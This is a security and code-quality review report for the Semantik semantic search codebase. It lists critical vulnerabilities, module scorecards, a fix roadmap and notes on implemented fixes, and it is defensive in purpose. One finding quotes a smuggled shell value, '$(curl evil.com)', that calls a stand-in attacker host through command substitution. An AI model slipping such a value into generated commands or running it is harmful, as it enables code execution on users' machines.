# Full Codebase Review Report

**Generated:** 2026-02-05
**Codebase:** Semantik (self-hosted semantic search engine)
**Branch:** feature/agent-sdk-migration
**Packages Reviewed:** 4 (shared, vecpipe, webui, webui-react)
**Modules Reviewed:** 42
**Review Dimensions:** Quality, Security, Architecture (3 independent reviews per module)

---

## Executive Summary

Semantik is a well-engineered self-hosted semantic search engine with mature patterns in database access, embedding pipelines, distributed task processing, and frontend state management. The codebase totals approximately **115,000+ lines** across **400+ files** spanning Python backend services and a React/TypeScript frontend.

**Overall Health: 6.5/10** -- The system is functional and deployable but has accumulated significant technical debt. The most critical concerns are:

1. **Security gaps requiring immediate attention** (14 critical + 8 high across the full stack)
2. **Pervasive code duplication** across all 4 packages (~5,000+ estimated duplicated lines)
3. **Architectural violations** where business logic leaks into wrong layers
4. **Type safety erosion** from widespread `dict[str, Any]` (Python) and missing runtime validation (TypeScript)

The security posture is strongest in SQL injection prevention (parameterized queries throughout) and credential encryption (Fernet). It is weakest in input validation, `trust_remote_code` handling, and frontend token storage.

---

## Package Health Overview

| Package | Score | Critical | High | Modules | ~LOC |
|---------|-------|----------|------|---------|------|
| **shared** | 6.6/10 | 14 | 52 | 17 | 30,000+ |
| **vecpipe** | 6.5/10 | 3 | 8 | 2 | 10,500 |
| **webui** | 6.5/10 | 12 | 45+ | 13 | 35,000+ |
| **webui-react** | 6.5/10 | 22 | 18 | 10 | 40,000+ |
| **TOTAL** | **6.5/10** | **51** | **123+** | **42** | **115,500+** |

---

## Top 10 Critical Issues (Must Fix)

These represent the highest-risk findings across the entire codebase, prioritized by exploitability and blast radius.

### 1. JWT Tokens in localStorage (webui-react)
**Risk: Account Takeover | Flagged by 5 of 10 frontend modules**

Both access and refresh tokens stored as plaintext in `localStorage`. Combined with no CSP headers and fragile DOMPurify loading, any XSS vulnerability enables full account takeover including long-lived session hijack via refresh token.

**Fix:** Migrate to httpOnly cookies with backend coordination. At minimum, add `partialize` to Zustand persist and consolidate all token access through the auth store.

### 2. Arbitrary Code Execution via `trust_remote_code` (shared, vecpipe)
**Risk: Remote Code Execution | Found in 3 locations**

- `reranker.py` (vecpipe): Hardcoded `trust_remote_code=True` bypassing the configurable safety gate
- `builtins/qwen3_reranker.py` (shared): Same hardcoded flag
- `builtins/splade_indexer.py` (shared): Same hardcoded flag

A supply-chain attack on a HuggingFace model repository would achieve full RCE on the host.

**Fix:** Use `settings.LLM_TRUST_REMOTE_CODE` (which defaults to `False`) in all locations. Implement a model repository allowlist.

### 3. Unrestricted Filesystem Scanning (webui)
**Risk: Information Disclosure | Full filesystem metadata read oracle**

`DirectoryScanService.scan_directory_preview()` accepts raw user paths with no containment. Authenticated users can enumerate files in `/etc/`, `/root/`, `/proc/`, Docker secrets, and other containers' volumes.

**Fix:** Add `Path.resolve()` and `is_relative_to()` checks against configured allowed roots. Default `should_enforce_document_roots` to `True`.

### 4. SQL Injection in Partition Utils (shared)
**Risk: Data Breach | Only SQL injection surface in entire codebase**

`verify_partition_keys()` interpolates `sample_size` directly into SQL via f-string at `partition_utils.py:703-714`.

**Fix:** Replace f-string with parameterized query `text("... LIMIT :sample_size")`. Single-line fix.

### 5. API Key Transmitted as URL Query Parameter (shared, webui, webui-react)
**Risk: Credential Exposure | Appears in backend + frontend**

`GET /api/v2/llm/models/refresh` accepts provider API keys (Anthropic/OpenAI) as query parameters, exposing them in server logs, browser history, proxy logs, and referrer headers.

**Fix:** Change to POST with key in request body. One-line route change + frontend update.

### 6. Command Injection via Connectors (shared)
**Risk: Remote Code Execution | Two vectors**

- IMAP: User-controlled mailbox name interpolated directly into IMAP SELECT command (CVSS 7.3)
- Git: User-controlled `ref` passed directly to git commands; refs starting with `--` interpreted as flags (CVSS 7.6)

**Fix:** Add input validation for IMAP (reject control characters/quotes) and git (validate ref format, use `--` separator).

### 7. Unbounded `**kwargs` Pass-Through in LLM Providers (shared)
**Risk: Security Bypass | Affects model selection and usage tracking**

Both Anthropic and OpenAI providers merge arbitrary `**kwargs` into API calls, allowing callers to override `model`, `messages`, `max_tokens`, bypassing tier-based model selection.

**Fix:** Apply parameter allowlist before merging kwargs.

### 8. Shell Injection in MCP Config Generator (webui-react)
**Risk: Code Execution | When users paste generated CLI snippets**

`shellEscape()` does not handle `$()`, backticks, or `${}`. A crafted value like `$(curl evil.com)` executes when pasted into a terminal.

**Fix:** Escape `$`, backtick, `\`, and `!` in shell strings. Validate TOML section headers.

### 9. Token Refresh Endpoint Path Mismatch (webui-react)
**Risk: Service Disruption | All users logged out on token expiry**

The refresh call uses `/auth/refresh` but the backend expects `/api/auth/refresh`. This will 404 in production, causing all users to be logged out when their access token expires.

**Fix:** Change to `/api/auth/refresh`. One-line fix with critical production impact.

### 10. Empty Internal API Key Accepted Silently (shared)
**Risk: Authentication Bypass | Disables VecPipe auth**

`_get_internal_api_key()` returns empty string when not configured, effectively disabling authentication for VecPipe embedding/upsert requests.

**Fix:** Raise `RuntimeError` in FULL mode if `INTERNAL_API_KEY` is not configured.

---

## Cross-Package Concerns

These patterns span multiple packages and represent systemic issues.

### 1. Pervasive Code Duplication (~5,000+ lines)
| Location | Duplication |
|----------|------------|
| shared/embedding | `dense.py` vs `providers/dense_local.py` (1,300+ lines) |
| shared/chunking | sync/async methods, tokenizer functions, exception hierarchies |
| shared/utils | Two independent ReDoS protection modules |
| webui/tasks | Embedding-validate-upsert cycle in 3 files |
| webui/websocket | ~120 lines duplicated across 3 handlers |
| vecpipe/root | Pressure handlers (~120 lines), governor callbacks |
| webui-react/components | Connector logic, modal boilerplate, utility functions (~2,000 lines) |

### 2. Type Safety Erosion (Full Stack)
- **Python:** `dict[str, Any]` as universal return type in webui repositories, services, and tasks. Drifting hardcoded defaults between files.
- **TypeScript:** Missing runtime validation on active SSE streaming path (security regression). `Any` types in vecpipe search pipeline helpers.
- **Cross-boundary:** Contracts package not actually shared between services; parallel schemas with different field names.

### 3. Input Validation Gaps (Full Stack)
- No path traversal protection in pipeline loader, directory scan, streaming processor
- No size limits on LLM prompts, reranker inputs, WebSocket messages, SSE streams
- Collection names flow unsanitized to Qdrant across both vecpipe and webui
- No UUID validation on path-interpolated IDs in MCP module

### 4. God Classes / God Functions
| File | Lines | Package |
|------|-------|---------|
| `ingestion.py` | 2,843 | webui/tasks |
| `CollectionService` | 1,834 | webui/services |
| `EmbeddingVisualizationTab` | 1,649 | webui-react |
| `memory_governor.py` | 1,432 | vecpipe |
| `schemas.py` | 1,131 | webui |
| `GovernedModelManager` | 1,014+536 | vecpipe |
| `PipelineExecutor` | 1,080 | shared/pipeline |
| `QuickCreateModal` | 1,002 | webui-react |
| `ScalableWebSocketManager` | 984 | webui/websocket |
| `service.py` | 897 | vecpipe/search |

### 5. Inconsistent Error Handling
Four different approaches coexist:
- Global exception handlers (webui/middleware)
- Unused `@handle_service_errors` decorator (webui/utils, 403 lines)
- Rich exception hierarchies (shared/database, shared/chunking, shared/llm)
- Bare `ValueError`/`RuntimeError` (shared/connectors, shared/embedding)

Frontend has 4 different error handling approaches across hooks, services, and utils.

### 6. Dead Code Accumulation (~3,000+ lines)
- `ws/` directory (webui) -- single-line stub
- `handle_service_errors` decorator + tests (863 lines)
- `featureChecklist.ts` (340 lines shipped to production)
- Orphaned `lib/telemetry.ts` duplicate
- Error response models in contracts (zero production usage)
- Production stubs in `chunking_error_handler.py`

---

## Module Scorecards

### shared (17 modules)

| Module | Quality | Security | Architecture |
|--------|---------|----------|-------------|
| benchmarks | 8/10 | 9/10 | 8/10 |
| chunking | 7/10 | 6/10 | 7/10 |
| chunks | 7/10 | 7/10 | 7/10 |
| config | 7/10 | 6/10 | 6/10 |
| connectors | 7/10 | 6/10 | 6/10 |
| contracts | 6/10 | 7/10 | 4/10 |
| database | 7/10 | 6/10 | 7/10 |
| dtos | 8/10 | 7/10 | 8/10 |
| embedding | 6/10 | 7/10 | 6/10 |
| llm | 7/10 | 6/10 | 8/10 |
| managers | 6/10 | 8/10 | 5/10 |
| metrics | 6/10 | 7/10 | 5/10 |
| model_manager | 7/10 | 8/10 | 7/10 |
| pipeline | 7/10 | 6.5/10 | 7.5/10 |
| plugins | 7.5/10 | 5/10 | 7/10 |
| text_processing | 7.5/10 | 7/10 | 6.5/10 |
| utils | 7/10 | 6/10 | 6/10 |

### vecpipe (2 modules)

| Module | Quality | Security | Architecture |
|--------|---------|----------|-------------|
| root | 6.5/10 | 6/10 | 7/10 |
| search | 7/10 | 6/10 | 7.5/10 |

### webui (13 modules)

| Module | Quality | Security | Architecture |
|--------|---------|----------|-------------|
| api | 7/10 | 7/10 | 6/10 |
| clients | 6/10 | 7/10 | 5/10 |
| config | 7/10 | 7/10 | 5/10 |
| mcp | 8/10 | 7/10 | 8.5/10 |
| middleware | 7/10 | 6/10 | 5/10 |
| model_manager | 7/10 | 8/10 | 6/10 |
| repositories | 6.5/10 | 7/10 | 5/10 |
| services | 6/10 | 7/10 | 6.5/10 |
| static | N/A | 7/10 | 6/10 |
| tasks | 6.5/10 | 7/10 | 6/10 |
| utils | 7/10 | 6/10 | 5/10 |
| websocket | 6.5/10 | 6/10 | 5.5/10 |
| ws | N/A | N/A | N/A |

### webui-react (10 modules)

| Module | Quality | Security | Architecture |
|--------|---------|----------|-------------|
| components | 6/10 | 6/10 | 7/10 |
| contexts | 8/10 | 10/10 | 8/10 |
| hooks | 7/10 | 6/10 | 8/10 |
| lib | 6/10 | 8/10 | 5/10 |
| pages | 7/10 | 7/10 | 6/10 |
| schemas | 6/10 | 5/10 | 6/10 |
| services | 7/10 | 6/10 | 7/10 |
| stores | 7/10 | 5/10 | 6/10 |
| types | 7/10 | 5/10 | 7/10 |
| utils | 7/10 | 7/10 | 7/10 |

---

## Recommendations Roadmap

### Immediate (Week 1) -- Security Critical

| # | Fix | Packages | Effort |
|---|-----|----------|--------|
| 1 | Fix SQL injection in `partition_utils.py` | shared | 15 min |
| 2 | Fix token refresh path (`/auth/refresh` -> `/api/auth/refresh`) | webui-react | 15 min |
| 3 | Fix VecPipe default port (8001 -> 8000) | webui | 15 min |
| 4 | Change API key endpoint from GET to POST | shared, webui-react | 1 hour |
| 5 | Make `trust_remote_code` configurable everywhere | shared, vecpipe | 1 hour |
| 6 | Add IMAP/git input validation | shared | 2 hours |
| 7 | Fail fast on empty internal API key | shared | 30 min |
| 8 | Fix shell/TOML escaping in MCP config generator | webui-react | 2 hours |
| 9 | Add timing-safe API key comparison | shared | 15 min |
| 10 | Remove `**kwargs` pass-through in LLM providers | shared | 1 hour |

### Short-term (Sprints 1-2) -- Security + Quality

| # | Fix | Packages | Effort |
|---|-----|----------|--------|
| 11 | Implement directory scan path allowlisting | webui | 4 hours |
| 12 | Fix directory scan WebSocket security (origin + auth) | webui | 4 hours |
| 13 | Migrate JWT to httpOnly cookies (or add partialize + CSP) | webui, webui-react | 2-3 days |
| 14 | Bundle DOMPurify as npm dependency | webui-react | 1 hour |
| 15 | Add Zod validation to `useAssistedFlowStream` | webui-react | 4 hours |
| 16 | Add collection name validation | vecpipe, shared | 2 hours |
| 17 | Add input size validation (reranker, LLM, WebSocket) | vecpipe, webui-react | 4 hours |
| 18 | Remove password hash from default serialization | webui | 1 hour |
| 19 | Fix user enumeration via distinct errors | webui | 30 min |
| 20 | Remove CSP `unsafe-eval` | webui | 2 hours |

### Medium-term (Sprints 3-6) -- Architecture + Quality

| # | Improvement | Packages | Effort |
|---|------------|----------|--------|
| 21 | Extract ModelManagerService from 690-line router | webui | 3 days |
| 22 | Decompose CollectionService (1,834 lines) | webui | 1 week |
| 23 | Migrate middleware to pure ASGI | webui | 3 days |
| 24 | Resolve circular shared->webui dependency | shared, webui | 2 days |
| 25 | Consolidate duplicate regex safety modules | shared | 1 day |
| 26 | Eliminate embedding code duplication | shared | 3 days |
| 27 | Introduce shared `ModelKey` dataclass | vecpipe | 2 days |
| 28 | Create unified VecPipe HTTP client | webui | 3 days |
| 29 | Introduce typed domain objects (replace dict[str, Any]) | webui | 1 week |
| 30 | Extract shared frontend utilities (formatDate, etc.) | webui-react | 1 day |

### Long-term (Quarter) -- Technical Debt

| # | Improvement | Packages |
|---|------------|----------|
| 31 | Decompose monolithic files (ingestion.py, memory_governor.py, etc.) | webui, vecpipe |
| 32 | Eliminate test/production code divergence in tasks | webui |
| 33 | Decompose frontend monolithic components | webui-react |
| 34 | Standardize DI across all packages | webui |
| 35 | Resolve connector contract drift | shared |
| 36 | Split `models.py` (1,845 lines) into domain packages | shared |
| 37 | Implement route-level code splitting | webui-react |
| 38 | Remove all dead code (~3,000+ lines) | all |
| 39 | Standardize error handling (one approach, full stack) | all |
| 40 | Adopt lazy logging format package-wide | shared, webui |

---

## Strengths

The codebase demonstrates significant engineering maturity in several areas:

1. **Zero SQL injection risk** -- Parameterized queries via SQLAlchemy throughout (one diagnostic utility exception, noted above)
2. **Sophisticated GPU memory management** -- LRU eviction, CPU offloading warm pools, pressure monitoring with circuit breakers
3. **Mature distributed systems patterns** -- Blue-green reindexing, producer-consumer with backpressure, atomic Redis via Lua scripts, transaction-before-dispatch
4. **Strong TypeScript discipline** -- No `any` usage, comprehensive interfaces with JSDoc, discriminated unions, strict mode
5. **Comprehensive test coverage** -- 150+ frontend test files, dedicated security/performance/E2E test suites
6. **Excellent documentation** -- Google-style docstrings, extensive CLAUDE.md, inline examples
7. **Production-grade resilience** -- Connection retry with backoff, fork safety, circuit breakers, graceful degradation
8. **Well-designed plugin system** -- Dual ABC/Protocol interfaces enabling zero-dependency external plugins
9. **Clean search pipeline** -- 11-stage linear orchestration with focused delegation and sparse/rerank fallback
10. **Fernet encryption for secrets** -- Properly implemented with key rotation support

---

## Statistics

| Metric | Count |
|--------|-------|
| Packages reviewed | 4 |
| Modules reviewed | 42 |
| Leaf reviews performed | 129 (42 modules x 3 dimensions + 3 backfill) |
| Critical issues | 51 |
| High-severity issues | 123+ |
| Estimated duplicated lines | 5,000+ |
| Estimated dead code lines | 3,000+ |
| Files with 1,000+ lines | 10+ |

---

## Incomplete Reviews

All planned modules were reviewed. The vecpipe root-level files were backfilled after initial discovery that they were missing from Phase 1.

---

## Implementation Notes (2026-02-05)

The following **Immediate (Week 1)** critical items have been implemented on branch `feature/agent-sdk-migration` in commit `416eab15`:

1. **SQL injection in partition utils fixed**
   - Updated `packages/shared/database/partition_utils.py` to use parameterized `LIMIT :sample_size` and validate positive `sample_size`.

2. **Token refresh path mismatch fixed**
   - Updated `apps/webui-react/src/services/api/v2/client.ts` from `/auth/refresh` to `/api/auth/refresh`.

3. **VecPipe default port mismatch fixed**
   - Updated `packages/webui/clients/sparse_client.py` default port from `8001` to `8000`.

4. **API key in URL query removed (hard cut to POST)**
   - Added `LLMModelsRefreshRequest` in `packages/webui/api/v2/llm_schemas.py`.
   - Switched `/api/v2/llm/models/refresh` from GET+query to POST+JSON in `packages/webui/api/v2/llm_settings.py`.
   - Updated frontend call in `apps/webui-react/src/services/api/v2/llm.ts`.

5. **`trust_remote_code` hardcoding removed**
   - Replaced hardcoded `True` with `settings.LLM_TRUST_REMOTE_CODE` in:
     - `packages/vecpipe/reranker.py`
     - `packages/shared/plugins/builtins/qwen3_reranker.py`
     - `packages/shared/plugins/builtins/splade_indexer.py`

6. **Connector input validation added (IMAP + Git)**
   - Added mailbox sanitization in `packages/shared/connectors/imap.py`.
   - Added git ref validation via `validate_git_ref` in `packages/shared/connectors/git.py`.

7. **Empty internal API key fallback removed**
   - Updated `packages/shared/pipeline/executor.py` to raise `RuntimeError` when `INTERNAL_API_KEY` is missing.

8. **MCP shell/TOML escaping hardened**
   - Updated shell escaping and TOML section-name validation in `apps/webui-react/src/utils/mcp-config-generator.ts`.
   - Added attack-case tests in `apps/webui-react/src/utils/__tests__/mcp-config-generator.test.ts`.

9. **Timing-safe compare completed**
   - Updated `packages/webui/dependencies.py` to use `secrets.compare_digest` for internal API key checks.

10. **LLM provider `**kwargs` security filtering added**
    - Replaced raw `params.update(kwargs)` with allowlisted merging in:
      - `packages/shared/llm/providers/openai_provider.py`
      - `packages/shared/llm/providers/anthropic_provider.py`

Additional security hardening completed during implementation:
- Directory scan root containment enforcement in `packages/webui/services/directory_scan_service.py`.
- Strict root-enforcement behavior in `packages/shared/config/webui.py`.

### Validation executed

- `uv run pytest -q tests/webui/api/v2/test_llm_settings.py tests/unit/llm/test_openai_provider.py tests/unit/llm/test_anthropic_provider.py tests/unit/connectors/test_git_connector.py tests/unit/connectors/test_imap_connector.py tests/test_reranker.py tests/unit/pipeline/test_executor.py -k "not e2e"`  
  Result: `233 passed`

- `uv run pytest -q tests/webui/services/test_directory_scan_service.py tests/webui/api/v2/test_directory_scan.py tests/integration/services/test_directory_scan_service.py -k "not e2e"`  
  Result: `29 passed, 3 skipped`

- `npm test --prefix apps/webui-react -- --run src/utils/__tests__/mcp-config-generator.test.ts src/services/api/v2/__tests__/llm.test.ts`  
  Result: `8 passed`

---

*Generated by hierarchical map-reduce code review: 129 leaf reviews -> 42 module summaries -> 4 package summaries -> this report.*
